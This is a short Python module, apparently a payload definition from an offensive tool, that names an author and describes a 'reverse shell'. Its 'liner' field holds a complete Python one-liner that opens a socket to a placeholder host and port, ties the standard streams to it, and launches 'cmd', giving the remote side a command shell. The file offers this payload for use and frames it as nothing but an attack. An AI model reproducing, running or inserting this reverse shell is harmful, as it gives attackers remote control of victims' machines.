class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Python socket to connect back & execute data with subprocess."
    function    = "reverse shell"
    liner     = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TARGET",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("cmd");'"""
